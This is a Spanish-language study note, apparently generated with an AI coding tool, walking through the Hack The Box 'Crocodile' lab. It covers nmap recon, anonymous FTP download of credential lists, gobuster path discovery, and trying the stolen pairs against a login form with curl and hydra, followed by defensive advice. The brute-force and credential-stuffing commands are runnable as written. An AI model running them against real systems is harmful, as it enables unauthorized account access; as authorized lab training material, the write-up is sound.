---
title: Crocodile (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, ftp, web, credential-stuffing, recon]
type: nota
status: en-progreso
source: claude-code
aliases: [Crocodile HTB, HTB Crocodile, crocodile starting point]
---

# Crocodile — HTB Starting Point (Tier 1)

**Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: FTP anonimo, directory brute-force, credential chaining**

Maquina diseñada para practicar la cadena FTP anonimo → exfiltracion de credenciales → reutilizacion en panel web. El patron es clasico en entornos mal configurados: un servicio "auxiliar" expone secretos que abren otro servicio mas critico.

> HTB Starting Point es un laboratorio legal y autorizado por Hack The Box para aprender tecnicas de pentesting en un entorno controlado.

---

## Objetivo

Obtener acceso al panel de administracion web usando credenciales filtradas via FTP anonimo y capturar la flag.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoria: descubrimiento de servicios con nmap.**

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Resultado relevante:

```
21/tcp  open  ftp     vsftpd 3.0.3
80/tcp  open  http    Apache httpd 2.4.41
```

- Puerto 21: FTP con vsftpd. El script `-sC` (scripts por defecto de nmap) suele detectar si el login anonimo esta habilitado (`ftp-anon: Anonymous FTP login allowed`).
- Puerto 80: servidor web Apache. Hay una interfaz HTTP que explorar.

---

## Enumeracion

### FTP anonimo — exfiltracion de listas de credenciales

**Categoria: misconfiguracion de acceso FTP.**

Conectarse sin credenciales usando el usuario convencional `anonymous`:

```bash
ftp <IP>
# Usuario: anonymous
# Password: (enter vacio o cualquier email)
```

Una vez dentro, listar y descargar los ficheros:

```bash
ls -la
get allowed.userlist
get allowed.userlist.passwd
bye
```

Revisar el contenido localmente:

```bash
cat allowed.userlist
cat allowed.userlist.passwd
```

Los ficheros contienen listas en texto plano: nombres de usuario y sus contraseñas correspondientes, por posicion (linea 1 de usuarios con linea 1 de passwords, etc.).

### HTTP — descubrimiento de rutas ocultas con gobuster

**Categoria: directory brute-force sobre HTTP.**

El sitio principal no muestra un panel de login en la raiz. Hay que encontrarlo:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Gobuster descubre `/login.php`. Acceder desde el navegador o con curl confirma que es un formulario de autenticacion.

> Ajuste en vivo: la wordlist exacta puede variar segun tu instalacion de Kali/Parrot. `/usr/share/wordlists/dirb/common.txt` es otra opcion comun.

---

## Acceso inicial (foothold)

**Categoria: credential stuffing entre servicios.**

Con las dos listas descargadas del FTP, probar cada par usuario/password en el formulario `/login.php`. En maquinas pequeñas se puede hacer manualmente desde el navegador; con herramientas:

```bash
# Ejemplo con curl para probar un par concreto
curl -s -X POST http://<IP>/login.php \
  -d "username=<usuario>&password=<password>" | grep -i "flag\|welcome\|dashboard"
```

O con hydra si la lista fuera larga:

```bash
hydra -L allowed.userlist -P allowed.userlist.passwd <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid"
```

> El mensaje de error exacto ("Invalid", "Wrong", etc.) hay que leerlo del HTML de la pagina antes de lanzar hydra. Ajustarlo en vivo.

Al encontrar el par valido, el panel muestra la flag directamente en la pagina de bienvenida.

---

## Escalada de privilegios

No requiere privesc: la flag se obtiene directamente tras autenticarse en el panel web. No hay acceso a shell ni necesidad de elevar privilegios.

---

## Flags

| Flag | Ubicacion |
|---|---|
| flag unica | Visible en la pagina web tras login exitoso (no hay `user.txt` / `root.txt` en esta maquina) |

La flag tiene el formato `HTB{<flag>}`. Copiarla tal cual en el portal de HTB para validar.

---

## Patron y teoria

### El patron: credential chaining entre servicios

**Schema: exfiltracion → reutilizacion lateral de credenciales.**

El ataque sigue tres pasos encadenados:

1. **Servicio permisivo expone secretos** — FTP anonimo permite leer ficheros que nunca deberian ser publicos (listas de usuarios y passwords en texto plano).
2. **Enumeracion de superficie de ataque** — gobuster encuentra un endpoint de autenticacion que no era obvio desde la raiz.
3. **Reutilizacion de credenciales** — las credenciales del FTP funcionan en el panel web porque comparten la misma fuente de verdad (o fueron copiadas sin cambio).

Este patron aparece constantemente en entornos reales: una base de datos de backup expuesta en S3, un repo git publico con `.env`, un share de SMB con credenciales hardcoded. El vector de entrada no es el servicio critico, sino uno "auxiliar" mal configurado.

### Como se defiende / como se diseña mejor (clave dev/purple team)

**FTP:**
- Deshabilitar login anonimo en vsftpd (`anonymous_enable=NO` en `/etc/vsftpd.conf`).
- Si el FTP es necesario, usar SFTP o FTPS con autenticacion por clave.
- Nunca almacenar credenciales, seeds, tokens o ficheros de configuracion en directorios accesibles por FTP.

**Credenciales:**
- No reutilizar credenciales entre servicios. Cada servicio tiene su propio secreto.
- Nunca guardar passwords en texto plano en ficheros de texto. Usar un gestor de secretos (Vault, AWS Secrets Manager, variables de entorno inyectadas en runtime).
- Aplicar el principio de minimo privilegio: si un fichero no necesita ser accesible por FTP, no lo pongas en ese directorio.

**Web:**
- Los paneles de administracion no deben estar en rutas predecibles (`/admin`, `/login.php`). Mejor un subdominio separado o autenticacion previa a nivel de red.
- Implementar rate-limiting y bloqueo por intentos fallidos para dificultar ataques de credential stuffing.
- Usar autenticacion de doble factor en paneles administrativos.

**En codigo (perspectiva dev):**
- Las credenciales nunca van en el repositorio ni en ficheros estaticos servidos. Van en variables de entorno o en un vault.
- Revisar el `.gitignore` y los permisos de directorio antes de cualquier despliegue. Ver [[04-seguridad-web-owasp]] para el top 10 de errores de configuracion.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
